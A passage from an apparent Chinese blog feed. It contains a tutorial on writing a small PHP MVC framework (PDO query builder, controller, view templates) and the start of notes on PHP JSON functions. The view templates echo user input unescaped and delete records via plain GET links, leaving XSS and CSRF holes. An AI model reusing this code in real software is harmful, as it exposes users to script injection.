$this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;rowCount();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 修改数据</div><div class="line">    public function update($data)</div><div class="line">    &#123;</div><div class="line">        $sql = sprintf(&quot;update `%s` set %s %s&quot;, $this-&gt;table, $this-&gt;formatUpdate($data), $this-&gt;filter);</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $data);</div><div class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;rowCount();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 占位符绑定具体的变量值</div><div class="line">     * @param PDOStatement $sth 要绑定的PDOStatement对象</div><div class="line">     * @param array $params 参数，有三种类型：</div><div class="line">     * 1）如果SQL语句用问号?占位符，那么$params应该为</div><div class="line">     *    [$a, $b, $c]</div><div class="line">     * 2）如果SQL语句用冒号:占位符，那么$params应该为</div><div class="line">     *    [&apos;a&apos; =&gt; $a, &apos;b&apos; =&gt; $b, &apos;c&apos; =&gt; $c]</div><div class="line">     *    或者</div><div class="line">     *    [&apos;:a&apos; =&gt; $a, &apos;:b&apos; =&gt; $b, &apos;:c&apos; =&gt; $c]</div><div class="line">     *</div><div class="line">     * @return PDOStatement</div><div class="line">     */</div><div class="line">    public function formatParam(PDOStatement $sth, $params = array())</div><div class="line">    &#123;</div><div class="line">        foreach ($params as $param =&gt; &amp;$value) &#123;</div><div class="line">            $param = is_int($param) ? $param + 1 : &apos;:&apos; . ltrim($param, &apos;:&apos;);</div><div class="line">            $sth-&gt;bindParam($param, $value);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return $sth;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 将数组转换成插入格式的sql语句</div><div class="line">    private function formatInsert($data)</div><div class="line">    &#123;</div><div class="line">        $fields = array();</div><div class="line">        $names = array();</div><div class="line">        foreach ($data as $key =&gt; $value) &#123;</div><div class="line">            $fields[] = sprintf(&quot;`%s`&quot;, $key);</div><div class="line">            $names[] = sprintf(&quot;:%s&quot;, $key);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $field = implode(&apos;,&apos;, $fields);</div><div class="line">        $name = implode(&apos;,&apos;, $names);</div><div class="line"></div><div class="line">        return sprintf(&quot;(%s) values (%s)&quot;, $field, $name);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 将数组转换成更新格式的sql语句</div><div class="line">    private function formatUpdate($data)</div><div class="line">    &#123;</div><div class="line">        $fields = array();</div><div class="line">        foreach ($data as $key =&gt; $value) &#123;</div><div class="line">            $fields[] = sprintf(&quot;`%s` = :%s&quot;, $key, $key);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return implode(&apos;,&apos;, $fields);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>应该说，Sql.php 是框架的核心部分。为什么？因为通过它，我们创建了一个 SQL 抽象层，可以大大减少了数据库的编程工作。虽然 PDO 接口本来已经很简洁，但是抽象之后框架的可灵活性更高。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">/**</div><div class="line"> * 数据库操作类，$pdo属性为静态属性，这样在页面执行周期内，</div><div class="line"> * 只要经过一次赋值，那么第二次再获取还是首次赋值的内容，这</div><div class="line"> * 里就是PDO对象，这样可以确保运行期间只有一个数据库连接对</div><div class="line"> * 像，这种是一种简单的单例模式</div><div class="line"> * Class Db</div><div class="line"> */</div><div class="line">class Db</div><div class="line">&#123;</div><div class="line">    private static $pdo = null;</div><div class="line"></div><div class="line">    public static function pdo()</div><div class="line">    &#123;</div><div class="line">        if (self::$pdo !== null) &#123;</div><div class="line">            return self::$pdo;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $dsn = sprintf(&apos;mysql:host=%s;dbname=%s&apos;, DB_HOST, DB_NAME);</div><div class="line">        $option = array(PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC);</div><div class="line"></div><div class="line">        return self::$pdo = new PDO($dsn, DB_USER, DB_PASS, $option);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="视图View类"><a href="#视图View类" class="headerlink" title="视图View类"></a>视图View类</h3><p>视图类 View.php 内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/**</div><div class="line"> * 视图基类</div><div class="line"> */</div><div class="line">class View</div><div class="line">&#123;</div><div class="line">    protected $variables = array();</div><div class="line">    protected $_controller;</div><div class="line">    protected $_action;</div><div class="line"></div><div class="line">    function __construct($controller, $action)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_controller = strtolower($controller);</div><div class="line">        $this-&gt;_action = strtolower($action);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    // 分配变量</div><div class="line">    public function assign($name, $value)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;variables[$name] = $value;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    // 渲染显示</div><div class="line">    public function render()</div><div class="line">    &#123;</div><div class="line">        extract($this-&gt;variables);</div><div class="line">        $defaultHeader = APP_PATH . &apos;application/views/header.php&apos;;</div><div class="line">        $defaultFooter = APP_PATH . &apos;application/views/footer.php&apos;;</div><div class="line"></div><div class="line">        $controllerHeader = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/header.php&apos;;</div><div class="line">        $controllerFooter = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/footer.php&apos;;</div><div class="line">        $controllerLayout = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/&apos; . $this-&gt;_action . &apos;.php&apos;;</div><div class="line"></div><div class="line">        // 页头文件</div><div class="line">        if (file_exists($controllerHeader)) &#123;</div><div class="line">            include ($controllerHeader);</div><div class="line">        &#125; else &#123;</div><div class="line">            include ($defaultHeader);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        //判断视图文件是否存在</div><div class="line">        if (file_exists($controllerLayout)) &#123;</div><div class="line">            include ($controllerLayout);</div><div class="line">        &#125; else &#123;</div><div class="line">            echo &quot;&lt;h1&gt;无法找到视图文件&lt;/h1&gt;&quot;;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        // 页脚文件</div><div class="line">        if (file_exists($controllerFooter)) &#123;</div><div class="line">            include ($controllerFooter);</div><div class="line">        &#125; else &#123;</div><div class="line">            include ($defaultFooter);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这样我们的核心的PHP MVC框架就编写完成了，下面我们开始编写应用来测试框架功能。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="数据库部署"><a href="#数据库部署" class="headerlink" title="数据库部署"></a>数据库部署</h3><p>在 SQL 中新建一个 mydb 数据库，使用下面的语句增加 item 数据表并插入2条记录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE ` mydb ` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</div><div class="line">USE ` mydb `;</div><div class="line">CREATE TABLE `item` (</div><div class="line">    `id` int(11) NOT NULL auto_increment,</div><div class="line">    `item_name` varchar(255) NOT NULL,</div><div class="line">    PRIMARY KEY (`id`)</div><div class="line">) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;</div><div class="line">INSERT INTO `item` VALUES(1, &apos;Hello World.&apos;);</div><div class="line">INSERT INTO `item` VALUES(2, &apos;Lets go!&apos;);</div></pre></td></tr></table></figure>
<h3 id="部署模型"><a href="#部署模型" class="headerlink" title="部署模型"></a>部署模型</h3><p> models 目录中创建一个 ItemModel.php 模型，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">/**</div><div class="line"> * 用户Model</div><div class="line"> */</div><div class="line">class ItemModel extends Model</div><div class="line">&#123;</div><div class="line">    /**</div><div class="line">     * 自定义当前模型操作的数据库表名称，</div><div class="line">     * 如果不指定，默认为类名称的小写字符串，</div><div class="line">     * 这里就是 item 表</div><div class="line">     * @var string</div><div class="line">     */</div><div class="line">    protected $table = &apos;item&apos;;</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 搜索功能，因为Sql父类里面没有现成的like搜索，</div><div class="line">     * 所以需要自己写SQL语句，对数据库的操作应该都放</div><div class="line">     * 在Model里面，然后提供给Controller直接调用</div><div class="line">     * @param $title string 查询的关键词</div><div class="line">     * @return array 返回的数据</div><div class="line">     */</div><div class="line">    public function search($keyword)</div><div class="line">    &#123;</div><div class="line">        $sql = &quot;select * from `$this-&gt;table` where `item_name` like :keyword&quot;;</div><div class="line">        $sth = Db::pdo()-&gt;prepare($sql);</div><div class="line">        $sth = $this-&gt;formatParam($sth, [&apos;:keyword&apos; =&gt; &quot;%$keyword%&quot;]);</div><div class="line">        $sth-&gt;execute();</div><div class="line"></div><div class="line">        return $sth-&gt;fetchAll();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>模型内容为空。因为 Item 模型继承了 Model，所以它拥有 Model 的所有功能。</p>
<h3 id="部署控制器"><a href="#部署控制器" class="headerlink" title="部署控制器"></a>部署控制器</h3><p>在 controllers 目录下创建一个 ItemController.php 控制器，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> </div><div class="line">class ItemController extends Controller</div><div class="line">&#123;</div><div class="line">    // 首页方法，测试框架自定义DB查询</div><div class="line">    public function index()</div><div class="line">    &#123;</div><div class="line">        $keyword = isset($_GET[&apos;keyword&apos;]) ? $_GET[&apos;keyword&apos;] : &apos;&apos;;</div><div class="line"></div><div class="line">        if ($keyword) &#123;</div><div class="line">            $items = (new ItemModel())-&gt;search($keyword);</div><div class="line">        &#125; else &#123;</div><div class="line">            // 查询所有内容，并按倒序排列输出</div><div class="line">            // where()方法可不传入参数，或者省略</div><div class="line">            $items = (new ItemModel)-&gt;where()-&gt;order([&apos;id DESC&apos;])-&gt;fetchAll();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;全部条目&apos;);</div><div class="line">        $this-&gt;assign(&apos;keyword&apos;, $keyword);</div><div class="line">        $this-&gt;assign(&apos;items&apos;, $items);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 查看单条记录详情</div><div class="line">    public function detail($id)</div><div class="line">    &#123;</div><div class="line">        // 通过?占位符传入$id参数</div><div class="line">        $item = (new ItemModel())-&gt;where([&quot;id = ?&quot;], [$id])-&gt;fetch();</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;条目详情&apos;);</div><div class="line">        $this-&gt;assign(&apos;item&apos;, $item);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 添加记录，测试框架DB记录创建（Create）</div><div class="line">    public function add()</div><div class="line">    &#123;</div><div class="line">        $data[&apos;item_name&apos;] = $_POST[&apos;value&apos;];</div><div class="line">        $count = (new ItemModel)-&gt;add($data);</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;添加成功&apos;);</div><div class="line">        $this-&gt;assign(&apos;count&apos;, $count);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 操作管理</div><div class="line">    public function manage($id = 0)</div><div class="line">    &#123;</div><div class="line">        $item = array();</div><div class="line">        if ($id) &#123;</div><div class="line">            // 通过名称占位符传入参数</div><div class="line">            $item = (new ItemModel())-&gt;where([&quot;id = :id&quot;], [&apos;:id&apos; =&gt; $id])-&gt;fetch();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;管理条目&apos;);</div><div class="line">        $this-&gt;assign(&apos;item&apos;, $item);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 更新记录，测试框架DB记录更新（Update）</div><div class="line">    public function update()</div><div class="line">    &#123;</div><div class="line">        $data = array(&apos;id&apos; =&gt; $_POST[&apos;id&apos;], &apos;item_name&apos; =&gt; $_POST[&apos;value&apos;]);</div><div class="line">        $count = (new ItemModel)-&gt;where([&apos;id = :id&apos;], [&apos;:id&apos; =&gt; $data[&apos;id&apos;]])-&gt;update($data);</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;修改成功&apos;);</div><div class="line">        $this-&gt;assign(&apos;count&apos;, $count);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    // 删除记录，测试框架DB记录删除（Delete）</div><div class="line">    public function delete($id = null)</div><div class="line">    &#123;</div><div class="line">        $count = (new ItemModel)-&gt;delete($id);</div><div class="line"></div><div class="line">        $this-&gt;assign(&apos;title&apos;, &apos;删除成功&apos;);</div><div class="line">        $this-&gt;assign(&apos;count&apos;, $count);</div><div class="line">        $this-&gt;render();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="部署视图"><a href="#部署视图" class="headerlink" title="部署视图"></a>部署视图</h3><p>在 views 目录下新建 header.php 和 footer.php 两个页头页脚模板，内容如下。</p>
<p>header.php，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</div><div class="line">    &lt;title&gt;&lt;?php echo $title ?&gt;&lt;/title&gt;</div><div class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; type=&quot;text/css&quot; /&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;h1&gt;&lt;?php echo $title ?&gt;&lt;/h1&gt;</div></pre></td></tr></table></figure></p>
<p>然后，在 views/item 创建以下几个视图文件。<br>index.php，浏览数据库内 item 表的所有记录，内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</div><div class="line">    &lt;input type=&quot;text&quot; value=&quot;&lt;?php echo $keyword ?&gt;&quot; name=&quot;keyword&quot;&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;p&gt;&lt;a href=&quot;/item/manage&quot;&gt;新建&lt;/a&gt;&lt;/p&gt;</div><div class="line"></div><div class="line">&lt;table&gt;</div><div class="line">    &lt;tr&gt;</div><div class="line">        &lt;th&gt;ID&lt;/th&gt;</div><div class="line">        &lt;th&gt;内容&lt;/th&gt;</div><div class="line">        &lt;th&gt;操作&lt;/th&gt;</div><div class="line">    &lt;/tr&gt;</div><div class="line">    &lt;?php foreach ($items as $item): ?&gt;</div><div class="line">        &lt;tr&gt;</div><div class="line">            &lt;td&gt;&lt;?php echo $item[&apos;id&apos;] ?&gt;&lt;/td&gt;</div><div class="line">            &lt;td&gt;</div><div class="line">                &lt;a href=&quot;/item/detail/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot; title=&quot;查看详情&quot;&gt;</div><div class="line">                    &lt;?php echo $item[&apos;item_name&apos;] ?&gt;</div><div class="line">                &lt;/a&gt;</div><div class="line">            &lt;/td&gt;</div><div class="line">            &lt;td&gt;</div><div class="line">                &lt;a href=&quot;/item/manage/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;编辑&lt;/a&gt;</div><div class="line">                &lt;a href=&quot;/item/delete/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;删除&lt;/a&gt;</div><div class="line">            &lt;/td&gt;</div><div class="line">        &lt;/tr&gt;</div><div class="line">    &lt;?php endforeach ?&gt;</div><div class="line">&lt;/table&gt;</div></pre></td></tr></table></figure>
<p>add.php，添加记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;成功添加&lt;?php echo $count ?&gt;条记录，点击返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>delete.php，删除记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;/item/index&quot;&gt;成功删除&lt;?php echo $count ?&gt;项，点击返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>update.php 更新记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;成功修改&lt;?php echo $count ?&gt;项，点击返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>manage.php 编辑记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;form  &lt;?php if (isset($item[&apos;id&apos;])) &#123; ?&gt;</div><div class="line">            action=&quot;/item/update/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;</div><div class="line">        &lt;?php &#125; else &#123; ?&gt;</div><div class="line">            action=&quot;/item/add&quot;</div><div class="line">        &lt;?php &#125; ?&gt;</div><div class="line">      method=&quot;post&quot;&gt;</div><div class="line"></div><div class="line">    &lt;?php if (isset($item[&apos;id&apos;])): ?&gt;</div><div class="line">        &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;</div><div class="line">    &lt;?php endif; ?&gt;</div><div class="line">    &lt;input type=&quot;text&quot; name=&quot;value&quot; value=&quot;&lt;?php echo isset($item[&apos;item_name&apos;]) ? $item[&apos;item_name&apos;] : &apos;&apos; ?&gt;&quot;&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>detail.php 显示记录，内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID：&lt;?php echo $item[&apos;id&apos;] ?&gt;&lt;br /&gt;</div><div class="line">Name：&lt;?php echo isset($item[&apos;item_name&apos;]) ? $item[&apos;item_name&apos;] : &apos;&apos; ?&gt;</div><div class="line"></div><div class="line">&lt;br /&gt;</div><div class="line">&lt;br /&gt;</div><div class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;返回&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<h2 id="应用测试"><a href="#应用测试" class="headerlink" title="应用测试"></a>应用测试</h2><p>直接访问　<a href="http://localhost/" target="_blank" rel="external">http://localhost/</a></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/mvc2.png" alt=""></p>
<h2 id="Github-Links"><a href="#Github-Links" class="headerlink" title="Github Links"></a>Github Links</h2><p><a href="https://github.com/uknowsec/myphp-frame" target="_blank" rel="external">Github myphp-frame</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.cnblogs.com/Steven-shi/p/5914175.html" target="_blank" rel="external">编写自己的PHP MVC框架笔记</a><br><a href="https://www.awaimai.com/128.html" target="_blank" rel="external">手把手编写PHP MVC框架实例教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP&amp;JSON 学习笔记</title>
    <link href="http://uknowsec.cn/posts/notes/PHP-JSON-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/PHP-JSON-学习笔记.html</id>
    <published>2017-10-18T12:47:45.000Z</published>
    <updated>2017-10-19T02:24:05.069Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="JSON介绍"><a href="#JSON介绍" class="headerlink" title="JSON介绍"></a>JSON介绍</h2><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式</p>
<h3 id="JSON格式"><a href="#JSON格式" class="headerlink" title="JSON格式"></a>JSON格式</h3><ul>
<li>1） 并列的数据之间用逗号（”, “）分隔。</li>
<li>2） 映射用冒号（”: “）表示。</li>
<li>3） 并列数据的集合（数组）用方括号(“[]”)表示。</li>
<li>4） 映射的集合（对象）用大括号（”{}”）表示</li>
</ul>
<h2 id="PHP-amp-JSON"><a href="#PHP-amp-JSON" class="headerlink" title="PHP&amp;JSON"></a>PHP&amp;JSON</h2><h3 id="JSON函数"><a href="#JSON函数" class="headerlink" title="JSON函数"></a>JSON函数</h3><table>
<thead>
<tr>
<th>函数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>json_encode</td>
<td style="text-align:center">对变量进行 JSON 编码</td>
</tr>
<tr>
<td>json_decode</td>
<td style="text-align:center">对 JSON 格式的字符串进行解码，转换为 PHP 变量</td>
</tr>
</tbody>
</table>
<h4 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode"></a>json_encode</h4><p>PHP json_encode() 用于对变量进行 JSON 编码，该函数如果执行成功返回 JSON 数据，否则返回 FALSE 。</p>
<h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string json_encode ( $value [, $options = 0 ] )</div></pre></td></tr></table></figure>
<h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><ul>
<li>value: 要编码的值。该函数只对 UTF-8 编码的数据有效。</li>
<li>options:由以下常量组成的二进制掩码：JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK,JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT</li>
</ul>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>以下实例演示了如何将 PHP 数组转换为 JSON 格式数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   $arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2, &apos;c&apos; =&gt; 3, &apos;d&apos; =&gt; 4, &apos;e&apos; =&gt; 5);</div><div class="line">   echo json_encode($arr);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</div></pre></td></tr></table></figure>
<p>以下实例演示了如何将 PHP 对象转换为 JSON 格式数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">   class Emp &#123;</div><div class="line">       public $name = &quot;&quot;;</div><div class="line">       public $hobbies  = &quot;&quot;;</div><div class="line">       public $birthdate = &quot;&quot;;</div><div class="line">   &#125;</div><div class="line">   $e = new Emp();</div><div class="line">   $e-&gt;name = &quot;sachin&quot;;</div><div class="line">   $e-&gt;hobbies  = &quot;sports&quot;;</div><div class="line">   $e-&gt;birthdate = date(&apos;m/d/Y h:i:s a&apos;, &quot;8/5/1974 12:20:03 p&quot;);</div><div class="line">   $e-&gt;birthdate = date(&apos;m/d/Y h:i:s a&apos;, strtotime(&quot;8/5/1974 12:20:03&quot;));</div><div class="line"></div><div class="line">   echo json_encode($e);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
